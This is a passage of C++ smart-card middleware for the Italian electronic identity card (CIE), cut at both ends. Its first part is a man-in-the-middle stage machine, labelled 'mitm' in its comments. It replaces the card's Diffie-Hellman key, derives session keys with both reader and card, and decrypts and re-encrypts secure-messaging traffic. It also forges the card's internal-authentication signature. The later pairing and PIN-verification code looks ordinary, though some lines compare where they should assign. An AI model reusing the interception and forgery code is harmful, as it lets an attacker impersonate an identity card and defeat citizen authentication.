			memcpy(dh_pBytes, resp+18, (*respSize)-20);
		}
		if (memcmp(curr_apdu, apdu_getDHDuopData_q, 17) == 0) {
			BYTE temp[42] = {};
			memcpy(temp, resp, 42); 
			ByteArray respBa = VarToByteArray(temp);
			parser.Parse(respBa);
			dh_q = parser.tags[0]->tags[0]->tags[0]->tags[0]->content;
			stage = READ_DAPP_PUBKEY;
		}

		if (memcmp(curr_apdu, apdu_getDHDuopData_getData, 5) == 0) {
			LOG_DEBUG("prev_apdu:");
			LOG_BUFFER(prev_apdu, prev_apduSize);
			if (memcmp(prev_apdu, apdu_getDHDuopData_g, 17) == 0) {
				memcpy(dh_gBytes+238, resp, 18);
				dh_g = VarToByteDynArray(dh_gBytes);
			}
			if (memcmp(prev_apdu, apdu_getDHDuopData_p, 17) == 0){
				memcpy(dh_pBytes+238, resp, 18);
				LOG_BUFFER(dh_pBytes, 256);
				dh_p = VarToByteDynArray(dh_pBytes);
			}
		}

		break;
	case DH_KEY_EXCHANGE:
		LOG_DEBUG("DH_KEY_EXCHANGE");
		if (memcmp(curr_apdu, apdu_GET_DATA_Data1, 11) == 0) {	
			// saving the dh pub key of the ICC		
			memcpy(dh_ICCpubKeyBytes, resp+8, 248);
			// sendind to the IFD the dh pub key of the mitm
			memcpy(resp+8, dh_pubKey_mitmBytes, 248);
		} else if (memcmp(curr_apdu, apdu_GET_DATA_Data2, 5) == 0) {
			// same as before but because the pub key is big
			// the operation is done with multiple apdus
			memcpy(dh_ICCpubKeyBytes+248, resp, 8);
			
			memcpy(resp, dh_pubKey_mitmBytes+248, 8);
			
			dh_ICCpubKey = VarToByteDynArray(dh_ICCpubKeyBytes);
			dh_IFDpubKey = VarToByteDynArray(dh_IFDpubKeyBytes);

			// form now the mitm has all the data to create the sessione key 
			// both with the IFD and the ICC 
			CRSA rsa(dh_p, dh_prKey_mitm);
			ByteDynArray secretIFD = rsa.RSA_PURE(dh_IFDpubKey);
			sessENC_IFD = sha256.Digest(ByteDynArray(secretIFD).append(VarToByteArray(diffENC))).left(16);
			sessMAC_IFD = sha256.Digest(ByteDynArray(secretIFD).append(VarToByteArray(diffMAC))).left(16);

			ByteDynArray secretICC = rsa.RSA_PURE(dh_ICCpubKey);
			sessENC_ICC = sha256.Digest(ByteDynArray(secretICC).append(VarToByteArray(diffENC))).left(16);
			sessMAC_ICC = sha256.Digest(ByteDynArray(secretICC).append(VarToByteArray(diffMAC))).left(16);
		
			sessSSC_IFD.resize(8);
			sessSSC_IFD.fill(0);
			sessSSC_IFD[7] = 1;

			sessSSC_ICC.resize(8);
			sessSSC_ICC.fill(0);
			sessSSC_ICC[7] = 1;

			LOG_DEBUG("sessENC_IFD");
			LOG_BUFFER(sessENC_IFD.data(), sessENC_IFD.size());
			LOG_DEBUG("sessENC_ICC");
			LOG_BUFFER(sessENC_ICC.data(), sessENC_ICC.size());
			stage = DAPP;
		}
		break;
	case DAPP:
			if (memcmp(curr_apdu, GetChallenge, 4) == 0) {
				
				// dec decipher using session key of the mitm with the ICC
				ByteDynArray iv(8);
				iv.fill(0);
				CDES3 encDes_ICC(sessENC_ICC, iv);
				BYTE tmp[16] = {};
				
				// saving the encrypted challenge
				memcpy(tmp, resp+3, 16);
				ByteArray encData;
				encData = VarToByteArray(tmp);
				LOG_DEBUG("encData:");
				LOG_BUFFER(encData.data(), encData.size());
				// decrypting the challenge
				challenge = encDes_ICC.RawDecode(encData);
				challenge.resize(RemoveISOPad(challenge),true);
				LOG_DEBUG("Challenge:");
				LOG_BUFFER(challenge.data(), challenge.size());

				// crafting the response
				increment(sessSSC_ICC);
				increment(sessSSC_IFD);
				CDES3 encDes_IFD(sessENC_IFD, iv);
				CMAC sigMac_IFD(sessMAC_IFD, iv);
				ByteDynArray encChallenge;
				// encrypt che challenge using the session key of the mitm with the IFD
				encChallenge = encDes_IFD.RawEncode(ISOPad(challenge));

				// crafting the SM response
				ByteDynArray datafield;
				uint8_t Val01 = 1;
				datafield.setASN1Tag(0x87, VarToByteDynArray(Val01).append(encChallenge));
				ByteDynArray calcMac = sessSSC_IFD;
				uint8_t macTail[4] = { 0x99, 0x02, 0x90, 0x00 };
				calcMac.append(datafield).append(VarToByteDynArray(macTail));
				auto smMac = sigMac_IFD.Mac(ISOPad(calcMac));
				uint8_t sw[2] = {0x90, 0x00};
				ByteDynArray respBa;
				ByteDynArray swBa = VarToByteDynArray(sw);
				ByteDynArray data;
				data = datafield.append(VarToByteDynArray(macTail));
				ByteDynArray ccfb;
				ccfb.setASN1Tag(0x8e, smMac);
				respBa.set(&data, &ccfb, &swBa);
				memcpy(resp, respBa.data(), *respSize);
			} else if (memcmp(curr_apdu, GiveRandom, 4) == 0) {
				// crafting the int auth payload
				CRSA intAuthKey(module, privexp);
				PRND2.random();
				toHashIFD.set(&PRND2, &dh_pubKey_mitm, &sn_iccBa, &rndIFD, &dh_IFDpubKey, &dh_g, &dh_p, &dh_q);
				ByteDynArray calcHashIFD = sha256.Digest(toHashIFD);
				uint8_t val6a = 0x6a;
				ByteArray val6ABa = VarToByteArray(val6a);
				uint8_t valbc = 0xbc;
				ByteArray valbcBa = VarToByteArray(valbc);
				ByteDynArray respBa;
				respBa.set(&val6ABa, &PRND2, &calcHashIFD, &valbcBa);
				SIG = intAuthKey.RSA_PURE(respBa);
				intAuthresp.set(&sn_iccBa, &SIG);

				//crafting the SM response
				ByteDynArray iv(8);
				iv.fill(0);
				increment(sessSSC_ICC);
				increment(sessSSC_IFD);
				CDES3 encDes_IFD(sessENC_IFD, iv);
				CMAC sigMac_IFD(sessMAC_IFD, iv);
				ByteDynArray encIntAuthresp;
				encIntAuthresp = encDes_IFD.RawEncode(ISOPad(intAuthresp));
				ByteDynArray datafield;
				uint8_t Val01 = 1;
				datafield.setASN1Tag(0x87, VarToByteDynArray(Val01).append(encIntAuthresp));
				ByteDynArray calcMac = sessSSC_IFD;
				uint8_t macTail[4] = { 0x99, 0x02, 0x90, 0x00 };
				calcMac.append(datafield).append(VarToByteDynArray(macTail));
				auto smMac = sigMac_IFD.Mac(ISOPad(calcMac));

				uint8_t sw[2] = {0x90, 0x00};
				ByteDynArray swBa = VarToByteDynArray(sw);
				ByteDynArray data;
				data = datafield.append(VarToByteDynArray(macTail));
				ByteDynArray ccfb;
				ccfb.setASN1Tag(0x8e, smMac);
				intAuthSMresp.set(&data, &ccfb, &swBa);

				memcpy(resp, intAuthSMresp.data(), 256);
			} else if (memcmp(prev_apdu, GiveRandom, 4) == 0) { 
				memcpy(resp, intAuthSMresp.data()+256, 35);
				stage = VERIFYPIN;
				ByteArray challengeBa = challenge.right(4);
    			ByteArray rndIFDBa = rndIFD.right(4);
				
				sessSSC_ICC.set(&challengeBa, &rndIFDBa);
				sessSSC_IFD.set(&challengeBa, &rndIFDBa);
			} else {
				LOG_BUFFER(resp, *respSize);
				BYTE temp[16] = {};
				memcpy(temp, resp, 16); 
				ByteDynArray respBa = VarToByteArray(temp);
				ByteArray crafted_resp = craft_respSM(sessENC_IFD, sessMAC_IFD, respBa, sessSSC_IFD);
				memcpy(resp, crafted_resp.data(), 16);
			}
		break;
	case VERIFYPIN:
		{
			LOG_BUFFER(resp, *respSize);
			BYTE temp[16] = {};
			memcpy(temp, resp, 16); 
			ByteDynArray respBa = VarToByteArray(temp);
			ByteArray crafted_resp = craft_respSM(sessENC_IFD, sessMAC_IFD, respBa, sessSSC_IFD);
			memcpy(resp, crafted_resp.data(), 16);

			stage = READSERIALECIE;
		}
		break;
    case READSERIALECIE:
        if (memcmp(curr_apdu, selectFile, 4) == 0) {
				ByteDynArray iv(8);
				iv.fill(0);
				CDES3 encDes_ICC(sessENC_ICC, iv);
				BYTE tmp[32] = {};
				
				
				memcpy(tmp, resp+3, 32);
				ByteArray encData;
				encData = VarToByteArray(tmp);
				LOG_DEBUG("encData:");
				LOG_BUFFER(encData.data(), encData.size());
				// decrypting the payload
                ByteDynArray payload;
				payload = encDes_ICC.RawDecode(encData);
				payload.resize(RemoveISOPad(payload),true);
				LOG_DEBUG("payload:");
				LOG_BUFFER(payload.data(), payload.size());

                // crafting the response
				increment(sessSSC_ICC);
				increment(sessSSC_IFD);
				CDES3 encDes_IFD(sessENC_IFD, iv);
				CMAC sigMac_IFD(sessMAC_IFD, iv);
				ByteDynArray encPayload;
				// encrypt che payload using the session key of the mitm with the IFD
				encPayload = encDes_IFD.RawEncode(ISOPad(payload));

				// crafting the SM response
				ByteDynArray datafield;
				uint8_t Val01 = 1;
				datafield.setASN1Tag(0x87, VarToByteDynArray(Val01).append(encPayload));
				ByteDynArray calcMac = sessSSC_IFD;
				uint8_t macTail[4] = { 0x99, 0x02, 0x90, 0x00 };
				calcMac.append(datafield).append(VarToByteDynArray(macTail));
				auto smMac = sigMac_IFD.Mac(ISOPad(calcMac));
				uint8_t sw[2] = {0x90, 0x00};
				ByteDynArray respBa;
				ByteDynArray swBa = VarToByteDynArray(sw);
				ByteDynArray data;
				data = datafield.append(VarToByteDynArray(macTail));
				ByteDynArray ccfb;
				ccfb.setASN1Tag(0x8e, smMac);
				respBa.set(&data, &ccfb, &swBa);
				memcpy(resp, respBa.data(), *respSize);
        }
        if (memcmp(curr_apdu, readFile, 4) == 0) {
            ByteDynArray iv(8);
            iv.fill(0);
            CDES3 encDes_ICC(sessENC_ICC, iv);
            BYTE tmp[16] = {};
            
            
            memcpy(tmp, resp+3, 16);
            ByteArray encData;
            encData = VarToByteArray(tmp);
            LOG_DEBUG("encData:");
            LOG_BUFFER(encData.data(), encData.size());
            // decrypting the payload
            ByteDynArray payload;
            payload = encDes_ICC.RawDecode(encData);
            payload.resize(RemoveISOPad(payload),true);
            LOG_DEBUG("payload:");
            LOG_BUFFER(payload.data(), payload.size());

            // crafting the response
            increment(sessSSC_ICC);
            increment(sessSSC_IFD);
            CDES3 encDes_IFD(sessENC_IFD, iv);
            CMAC sigMac_IFD(sessMAC_IFD, iv);
            ByteDynArray encPayload;
            // encrypt che payload using the session key of the mitm with the IFD
            encPayload = encDes_IFD.RawEncode(ISOPad(payload));

            // crafting the SM response
            ByteDynArray datafield;
            uint8_t Val01 = 1;
            datafield.setASN1Tag(0x87, VarToByteDynArray(Val01).append(encPayload));
            ByteDynArray calcMac = sessSSC_IFD;
            uint8_t macTail[4] = { 0x99, 0x02, 0x62, 0x82 };
            calcMac.append(datafield).append(VarToByteDynArray(macTail));
            auto smMac = sigMac_IFD.Mac(ISOPad(calcMac));
            uint8_t sw[2] = {0x62, 0x82};
            ByteDynArray respBa;
            ByteDynArray swBa = VarToByteDynArray(sw);
            ByteDynArray data;
            data = datafield.append(VarToByteDynArray(macTail));
            ByteDynArray ccfb;
            ccfb.setASN1Tag(0x8e, smMac);
            respBa.set(&data, &ccfb, &swBa);
            memcpy(resp, respBa.data(), *respSize);

            stage = READCERTCIE;
        }
		break;
	case READCERTCIE:
		if (memcmp(curr_apdu, selectFile, 4) == 0) {
			ByteDynArray iv(8);
			iv.fill(0);
			CDES3 encDes_ICC(sessENC_ICC, iv);
			BYTE tmp[32] = {};
			
			
			memcpy(tmp, resp+3, 32);
			ByteArray encData;
			encData = VarToByteArray(tmp);
			LOG_DEBUG("encData:");
			LOG_BUFFER(encData.data(), encData.size());
			// decrypting the payload
			ByteDynArray payload;
			payload = encDes_ICC.RawDecode(encData);
			payload.resize(RemoveISOPad(payload),true);
			LOG_DEBUG("payload:");
			LOG_BUFFER(payload.data(), payload.size());

			// crafting the response
			increment(sessSSC_ICC);
			increment(sessSSC_IFD);
			CDES3 encDes_IFD(sessENC_IFD, iv);
			CMAC sigMac_IFD(sessMAC_IFD, iv);
			ByteDynArray encPayload;
			// encrypt che payload using the session key of the mitm with the IFD
			encPayload = encDes_IFD.RawEncode(ISOPad(payload));

			// crafting the SM response
			ByteDynArray datafield;
			uint8_t Val01 = 1;
			datafield.setASN1Tag(0x87, VarToByteDynArray(Val01).append(encPayload));
			ByteDynArray calcMac = sessSSC_IFD;
			uint8_t macTail[4] = { 0x99, 0x02, 0x90, 0x00 };
			calcMac.append(datafield).append(VarToByteDynArray(macTail));
			auto smMac = sigMac_IFD.Mac(ISOPad(calcMac));
			uint8_t sw[2] = {0x90, 0x00};
			ByteDynArray respBa;
			ByteDynArray swBa = VarToByteDynArray(sw);
			ByteDynArray data;
			data = datafield.append(VarToByteDynArray(macTail));
			ByteDynArray ccfb;
			ccfb.setASN1Tag(0x8e, smMac);
			respBa.set(&data, &ccfb, &swBa);
			memcpy(resp, respBa.data(), *respSize);
        }
		if (memcmp(curr_apdu, readFile, 4) == 0) {
            ByteDynArray iv(8);
            iv.fill(0);
            CDES3 encDes_ICC(sessENC_ICC, iv);
            BYTE tmp[0x88] = {};
            
            
            memcpy(tmp, resp+4, 0x88);
            ByteArray encData;
            encData = VarToByteArray(tmp);
            LOG_DEBUG("encData:");
            LOG_BUFFER(encData.data(), encData.size());
            // decrypting the payload
            ByteDynArray payload;
            payload = encDes_ICC.RawDecode(encData);
            payload.resize(RemoveISOPad(payload),true);
            LOG_DEBUG("payload:");
            LOG_BUFFER(payload.data(), payload.size());

            // crafting the response
            increment(sessSSC_ICC);
            increment(sessSSC_IFD);
            CDES3 encDes_IFD(sessENC_IFD, iv);
            CMAC sigMac_IFD(sessMAC_IFD, iv);
            ByteDynArray encPayload;
            // encrypt che payload using the session key of the mitm with the IFD
            encPayload = encDes_IFD.RawEncode(ISOPad(payload));

            // crafting the SM response
            ByteDynArray datafield;
            uint8_t Val01 = 1;
            datafield.setASN1Tag(0x87, VarToByteDynArray(Val01).append(encPayload));
            ByteDynArray calcMac = sessSSC_IFD;
            uint8_t macTail[4] = { 0x99, 0x02, 0x62, 0x82 };
            calcMac.append(datafield).append(VarToByteDynArray(macTail));
            auto smMac = sigMac_IFD.Mac(ISOPad(calcMac));
            uint8_t sw[2] = {0x62, 0x82};
            ByteDynArray respBa;
            ByteDynArray swBa = VarToByteDynArray(sw);
            ByteDynArray data;
            data = datafield.append(VarToByteDynArray(macTail));
            ByteDynArray ccfb;
            ccfb.setASN1Tag(0x8e, smMac);
            respBa.set(&data, &ccfb, &swBa);
            memcpy(resp, respBa.data(), *respSize);

			cnt += 0x80;
			readFile[2] == (uint8_t)((cnt >> 8) & 0xFF);
			readFile[3] == (uint8_t)(cnt & 0xFF);
		}
		break;
	default:
		break;
	}
}



OID OID_SURNAME = ((OID(2) += 5) += 4) += 4;

OID OID_GIVENNAME = ((OID(2) += 5) += 4) += 42;

extern CModuleInfo moduleInfo;

void GetCertInfo(CryptoPP::BufferedTransformation & certin,
                 std::string & serial,
                 CryptoPP::BufferedTransformation & issuer,
                 CryptoPP::BufferedTransformation & subject,
                 std::string & notBefore,
                 std::string & notAfter,
                 CryptoPP::Integer& mod,
                 CryptoPP::Integer& pubExp);

std::vector<word32> fromObjectIdentifier(std::string sObjId);



DWORD CardAuthenticateEx(IAS*       ias,
                        DWORD       PinId,
                        DWORD       dwFlags,
                        BYTE*       pbPinData,
                        DWORD       cbPinData,
                        BYTE*       *ppbSessionPin,
                        DWORD*      pcbSessionPin,
						PROGRESS_CALLBACK progressCallBack,
                        int*        pcAttemptsRemaining);

extern "C" {
    CK_RV CK_ENTRY AbilitaCIE(const char*  szPAN, const char*  szPIN, int* attempts, PROGRESS_CALLBACK progressCallBack, COMPLETED_CALLBACK completedCallBack);
    CK_RV CK_ENTRY VerificaCIEAbilitata(const char*  szPAN);
    CK_RV CK_ENTRY DisabilitaCIE(const char*  szPAN);
}

CK_RV CK_ENTRY VerificaCIEAbilitata(const char*  szPAN)
{
            
	if(IAS::IsEnrolled(szPAN))
		return 1;
	else
		return 0;
    
}


CK_RV CK_ENTRY DisabilitaCIE(const char*  szPAN)
{
    if(IAS::IsEnrolled(szPAN))
    {
        IAS::Unenroll(szPAN);
        LOG_INFO("DisabilitaCIE - CIE number %s removed", szPAN);
        return CKR_OK;
    }
    else
    {
        LOG_ERROR("DisabilitaCIE - Unable to remove CIE number %s, CIE is not enrolled", szPAN);
        return CKR_FUNCTION_FAILED;
    }

	return CKR_FUNCTION_FAILED;
}

CK_RV CK_ENTRY AbilitaCIE(const char*  szPAN, const char*  szPIN, int* attempts, PROGRESS_CALLBACK progressCallBack, COMPLETED_CALLBACK completedCallBack)
{
    char* readers = NULL;
    char* ATR = NULL;

    LOG_INFO("***** Starting AbbinaCIE *****");
    LOG_DEBUG("szPAN:%s, pin len : %d", szPAN, strlen(szPIN));

    // verifica bontà PIN
    if(szPIN == NULL || strnlen(szPIN, 9) != 8)
    {
    	return CKR_PIN_LEN_RANGE;
    }

	size_t i = 0;
	while (i < 8 && (szPIN[i] >= '0' && szPIN[i] <= '9'))
		i++;

	if (i != 8)
		return CKR_PIN_INVALID;

	try
    {
		std::map<uint8_t, ByteDynArray> hashSet;
		
		DWORD len = 0;
		ByteDynArray CertCIE;
		ByteDynArray SOD;
		ByteDynArray IdServizi;
		
		SCARDCONTEXT hSC;

        LOG_INFO("AbbinaCIE - Connecting to CIE...");
        progressCallBack(1, "Connessione alla CIE");
        
		long nRet = SCardEstablishContext(SCARD_SCOPE_USER, nullptr, nullptr, &hSC);
        if(nRet != SCARD_S_SUCCESS){
            LOG_ERROR("AbbinaCIE - SCardEstablishContext error: %d", nRet);
            return CKR_DEVICE_ERROR;
        }
        
        nRet = SCardListReaders(hSC, nullptr, NULL, &len);
        if (nRet != SCARD_S_SUCCESS) {
            LOG_ERROR("AbbinaCIE - SCardListReaders error: %d. Len: %d", nRet, len);
            return CKR_TOKEN_NOT_PRESENT;
        }
        
        if(len == 1)
            return CKR_TOKEN_NOT_PRESENT;
        
        readers = (char*)malloc(len);
        
        nRet = SCardListReaders(hSC, nullptr, (char*)readers, &len);
        if (nRet != SCARD_S_SUCCESS) {
            LOG_ERROR("AbbinaCIE - SCardListReaders error: %d", nRet);
            free(readers);
            return CKR_TOKEN_NOT_PRESENT;
        }

        progressCallBack(5, "CIE Connessa");
        LOG_INFO("AbbinaCIE - CIE Connected");
        
		char *curreader = readers;
		bool foundCIE = false;
		for (; curreader[0] != 0; curreader += strnlen(curreader, len) + 1)
        {
            safeConnection conn(hSC, curreader, SCARD_SHARE_SHARED);
            if (!conn.hCard)
                continue;

            DWORD atrLen = 40;
            nRet = SCardGetAttrib(conn.hCard, SCARD_ATTR_ATR_STRING, (uint8_t*)ATR, &atrLen);
            if(nRet != SCARD_S_SUCCESS) {
                LOG_ERROR("AbbinaCIE - SCardGetAttrib error, %d\n", nRet);
                free(readers);
                return CKR_DEVICE_ERROR;
            }
            
            ATR = (char*)malloc(atrLen);
            
            nRet = SCardGetAttrib(conn.hCard, SCARD_ATTR_ATR_STRING, (uint8_t*)ATR, &atrLen);
            if(nRet != SCARD_S_SUCCESS) {
                LOG_ERROR("AbbinaCIE - SCardGetAttrib error, %d\n", nRet);
                free(readers);
                free(ATR);
                return CKR_DEVICE_ERROR;
            }
            
            ByteArray atrBa((BYTE*)ATR, atrLen);
            

            progressCallBack(10, "Verifica carta esistente");

            LOG_DEBUG("AbbinaCIE - Checking if card has been activated yet...");
            IAS ias((CToken::TokenTransmitCallback)TokenTransmitCallback, atrBa);
            ias.SetCardContext(&conn);
            
            foundCIE = false;
            
            ias.token.Reset();
            ias.SelectAID_IAS();
            ias.ReadPAN();
        
            
            ByteDynArray IntAuth;
            ias.SelectAID_CIE();
            ias.ReadDappPubKey(IntAuth);
            //ias.SelectAID_CIE();
            ias.InitEncKey();
            
            ByteDynArray IdServizi;
            ias.ReadIdServizi(IdServizi);

            if (ias.IsEnrolled())
            {
                LOG_ERROR("AbbinaCIE - CIE already enabled. Serial number: %s\n", IdServizi.data());
                return CARD_ALREADY_ENABLED;
            }


            progressCallBack(15, "Lettura dati dalla CIE");
            LOG_INFO("AbbinaCIE - Reading data from CIE...");
        
            ByteArray serviziData(IdServizi.left(12));

            ByteDynArray SOD;
            ias.ReadSOD(SOD);
            uint8_t digest = ias.GetSODDigestAlg(SOD);
                        
            ByteArray intAuthData(IntAuth.left(GetASN1DataLenght(IntAuth)));
            
			ByteDynArray IntAuthServizi;
            ias.ReadServiziPubKey(IntAuthServizi);
            ByteArray intAuthServiziData(IntAuthServizi.left(GetASN1DataLenght(IntAuthServizi)));

            ias.SelectAID_IAS();
            ByteDynArray DH;
            ias.ReadDH(DH);
            ByteArray dhData(DH.left(GetASN1DataLenght(DH)));

            // poichè la CIE abilitata sul desktop può essere solo una, szPAN passato da CIEID è sempre null
//            if (szPAN && IdServizi != ByteArray((uint8_t*)szPAN, strnlen(szPAN, 20)))
//                continue;

            foundCIE = true;
            
            progressCallBack(20, "Autenticazione...");
            
            free(readers);
            readers = NULL;
            free(ATR);
            ATR = NULL;

            DWORD rs = CardAuthenticateEx(&ias, ROLE_USER, FULL_PIN, (BYTE*)szPIN, (DWORD)strnlen(szPIN, sizeof(szPIN)), nullptr, 0, progressCallBack, attempts);
            if (rs == SCARD_W_WRONG_CHV)
            {
                LOG_ERROR("AbbinaCIE - CardAuthenticateEx Wrong Pin");
                free(ATR);
                free(readers);
                return CKR_PIN_INCORRECT;
            }
            else if (rs == SCARD_W_CHV_BLOCKED)
            {
                LOG_ERROR("AbbinaCIE - CardAuthenticateEx Pin locked");
                free(ATR);
                free(readers);
                return CKR_PIN_LOCKED;
            }
            else if (rs != SCARD_S_SUCCESS)
            {
                LOG_ERROR("AbbinaCIE - CardAuthenticateEx Generic error, res:%d", rs);
                free(ATR);
                free(readers);
                return CKR_GENERAL_ERROR;
            }

            //ias.CUSTOM();
            //ias.UnblockPIN();
            //ByteDynArray PIN;
            //PIN.append(ByteArray((uint8_t*)szPIN, 8));
            //ias.VerifyPIN(PIN);
            
            
            progressCallBack(45, "Lettura seriale");
            
            ByteDynArray Serial;
            ias.ReadSerialeCIE(Serial);
            ByteArray serialData = Serial.left(9);
            std::string st_serial((char*)serialData.data(), serialData.size());
            
            progressCallBack(55, "Lettura certificato");
            LOG_INFO("AbbinaCIE - Reading certificate...");
            
            ByteDynArray CertCIE;
            ias.ReadCertCIE(CertCIE);
            ByteArray certCIEData = CertCIE.left(GetASN1DataLenght(CertCIE));
            
            LOG_INFO("AbbinaCIE - Verifying SOD, digest algorithm: %s", (digest == 1) ? "RSA/SHA256" : "RSA-PSS/SHA512");
            if (digest == 1)
            {
                CSHA256 sha256;
                hashSet[0xa1] = sha256.Digest(serviziData);
                hashSet[0xa4] = sha256.Digest(intAuthData);
                hashSet[0xa5] = sha256.Digest(intAuthServiziData);
                hashSet[0x1b] = sha256.Digest(dhData);
                hashSet[0xa2] = sha256.Digest(serialData);
                hashSet[0xa3] = sha256.Digest(certCIEData);
                ias.VerificaSOD(SOD, hashSet);

            }
            else
            {
                CSHA512 sha512;
                hashSet[0xa1] = sha512.Digest(serviziData);
                hashSet[0xa4] = sha512.Digest(intAuthData);
                hashSet[0xa5] = sha512.Digest(intAuthServiziData);
                hashSet[0x1b] = sha512.Digest(dhData);
                hashSet[0xa2] = sha512.Digest(serialData);
                hashSet[0xa3] = sha512.Digest(certCIEData);
                ias.VerificaSODPSS(SOD, hashSet);
            }

            ByteArray pinBa((uint8_t*)szPIN, 4);
            
            progressCallBack(85, "Memorizzazione in cache");
            LOG_INFO("AbbinaCIE - Saving certificate in cache...");
            
            std::string sidServizi((char*)IdServizi.data(), IdServizi.size());

            ias.SetCache((char*)sidServizi.c_str(), CertCIE, pinBa);
            
            std::string span((char*)sidServizi.c_str());
            std::string name;
            std::string surname;
            
            CryptoPP::ByteQueue certin;
            certin.Put(CertCIE.data(),CertCIE.size());
            
            std::string serial;
            CryptoPP::ByteQueue issuer;
            CryptoPP::ByteQueue subject;
            std::string notBefore;
            std::string notAfter;
            CryptoPP::Integer mod;
            CryptoPP::Integer pubExp;
            
            GetCertInfo(certin, serial, issuer, subject, notBefore, notAfter, mod, pubExp);
            
            CryptoPP::BERSequenceDecoder subjectEncoder(subject);
            {
                while(!subjectEncoder.EndReached())
                {
                    CryptoPP::BERSetDecoder item(subjectEncoder);
                    CryptoPP::BERSequenceDecoder attributes(item); {
                        
                        OID oid(attributes);
                        if(oid == OID_GIVENNAME)
                        {
                            CryptoPP::byte tag = 0;
                            attributes.Peek(tag);
                            
                            CryptoPP::BERDecodeTextString(
                                                          attributes,
                                                          name,
                                                          tag);
                        }
                        else if(oid == OID_SURNAME)
                        {
                            CryptoPP::byte tag = 0;
                            attributes.Peek(tag);
                            
                            CryptoPP::BERDecodeTextString(
                                                          attributes,
                                                          surname,
                                                          tag);
                        }
                        
                        item.SkipAll();
                    }
                }
            }
        
            subjectEncoder.SkipAll();
            
            std::string fullname = name + " " + surname;
            completedCallBack(span.c_str(), fullname.c_str(), st_serial.c_str());
		}
        
		if (!foundCIE) {
            LOG_ERROR("AbbinaCIE - No CIE available");
            free(ATR);
            free(readers);
            return CKR_TOKEN_NOT_RECOGNIZED;
            
		}

	}
	catch (std::exception &ex) {
		LOG_ERROR("AbbinaCIE - Exception %s ", ex.what());
        if(ATR)
            free(ATR);
        
        if(readers)
            free(readers);
        return CKR_GENERAL_ERROR;
	}

    if(ATR)
        free(ATR);
    if(readers)
    	free(readers);
    
    LOG_INFO("AbbinaCIE - CIE paired successfully");
    progressCallBack(100, "OK!");
    LOG_INFO("***** AbbinaCIE Ended *****");
    
    return SCARD_S_SUCCESS;
}

DWORD CardAuthenticateEx(IAS*       ias,
                         DWORD       PinId,
                         DWORD       dwFlags,
                         BYTE*       pbPinData,
                         DWORD       cbPinData,
                         BYTE*       *ppbSessionPin,
                         DWORD*      pcbSessionPin,
						 PROGRESS_CALLBACK progressCallBack,
                         int*      pcAttemptsRemaining) {
    
    LOG_INFO("***** Starting CardAuthenticateEx *****");
    LOG_DEBUG("Pin id: %d, dwFlags: %d, cbPinData: %d, pbSessionPin: %s, pcAttemptsRemaining: %d", PinId, dwFlags, cbPinData, pcbSessionPin, *pcAttemptsRemaining);

    LOG_INFO("CardAuthenticateEx - Selecting IAS and CIE AID");

	progressCallBack(21, "selected CIE applet");
    ias->SelectAID_IAS();
    ias->SelectAID_CIE();
    
    

    progressCallBack(22, "init DH Param");
    // leggo i parametri di dominio DH e della chiave di extauth
    LOG_INFO("CardAuthenticateEx - Reading DH parameters");

    ias->InitDHParam();
    

    progressCallBack(24, "read DappPubKey");

    ByteDynArray dappData;
    ias->ReadDappPubKey(dappData);
    
    LOG_INFO("CardAuthenticateEx - Performing DH Exchange");

    progressCallBack(26, "InitExtAuthKeyParam");
    ias->InitExtAuthKeyParam();
    
    progressCallBack(28, "DHKeyExchange");
    ias->DHKeyExchange();

    progressCallBack(30, "DAPP");

    // DAPP
    ias->DAPP();
    
    progressCallBack(32, "VerifyPIN");

    // verifica PIN
    StatusWord sw;
    if (PinId == ROLE_USER) {
        LOG_INFO("CardAuthenticateEx - Verifying PIN");
        ByteDynArray PIN;
        if ((dwFlags & FULL_PIN) != FULL_PIN)
            ias->GetFirstPIN(PIN);
        PIN.append(ByteArray(pbPinData, cbPinData));
        sw = ias->VerifyPIN(PIN);
    }
    else if (PinId == ROLE_ADMIN) {
        LOG_INFO("CardAuthenticateEx - Verifying PUK");
        ByteArray pinBa(pbPinData, cbPinData);
        sw = ias->VerifyPUK(pinBa);
    }
    else{
        LOG_ERROR("CardAuthenticateEx - Invalid parameter: wrong PinId value");
        return SCARD_E_INVALID_PARAMETER;
    }
    
    progressCallBack(34, "verifyPIN ok");

    if (sw == 0x6983) {
        //if (PinId == ROLE_USER)
        //    ias->IconaSbloccoPIN();
        LOG_ERROR("CardAuthenticateEx - Pin locked");
        return SCARD_W_CHV_BLOCKED;
    }
    if (sw >= 0x63C0 && sw <= 0x63CF) {
        if (pcAttemptsRemaining != nullptr)
            *pcAttemptsRemaining = sw - 0x63C0;
        LOG_ERROR("CardAuthenticateEx - Wrong Pin");
        return SCARD_W_WRONG_CHV;
    }
    if (sw == 0x6700) {
        LOG_ERROR("CardAuthenticateEx - Wrong Pin");
        return SCARD_W_WRONG_CHV;
    }
    if (sw == 0x6300) {
        LOG_ERROR("CardAuthenticateEx - Wrong Pin");
        return SCARD_W_WRONG_CHV;
    }
    if (sw != 0x9000) {
        LOG_ERROR("CarduAuthenticateEx - Smart Card error: 0x%04X", sw);
    }

    LOG_INFO("***** CardAuthenticateEx Ended *****");
    return SCARD_S_SUCCESS;
}

int TokenTransmitCallback(safeConnection *conn, BYTE *apdu, DWORD apduSize, BYTE *resp, DWORD *respSize) {

    LOG_DEBUG("TokenTransmitCallback - Apdu:");
    LOG_BUFFER(apdu, apduSize);

    if (apduSize == 2) {
        WORD code = *(WORD*)apdu;
        if (code == 0xfffd) {
            long bufLen = *respSize;
            *respSize = sizeof(conn->hCard)+2;
            CryptoPP::memcpy_s(resp, bufLen, &conn->hCard, sizeof(conn->hCard));
            resp[sizeof(&conn->hCard)] = 0;
            resp[sizeof(&conn->hCard) + 1] = 0;
            
            return SCARD_S_SUCCESS;
        }
        else if (code == 0xfffe) {
            DWORD protocol = 0;
            LOG_INFO("TokenTransmitCallback - Unpowering Card");
            auto ris = SCardReconnect(conn->hCard, SCARD_SHARE_SHARED, SCARD_PROTOCOL_Tx, SCARD_UNPOWER_CARD, &protocol);
            
            
            if (ris == SCARD_S_SUCCESS) {
                SCardBeginTransaction(conn->hCard);
                *respSize = 2;
                resp[0] = 0x90;
                resp[1] = 0x00;
            }
            return ris;
        }
        else if (code == 0xffff) {
            DWORD protocol = 0;
            auto ris = SCardReconnect(conn->hCard, SCARD_SHARE_SHARED, SCARD_PROTOCOL_Tx, SCARD_RESET_CARD, &protocol);
            if (ris == SCARD_S_SUCCESS) {
                SCardBeginTransaction(conn->hCard);
                *respSize = 2;
                resp[0] = 0x90;
                resp[1] = 0x00;
            }
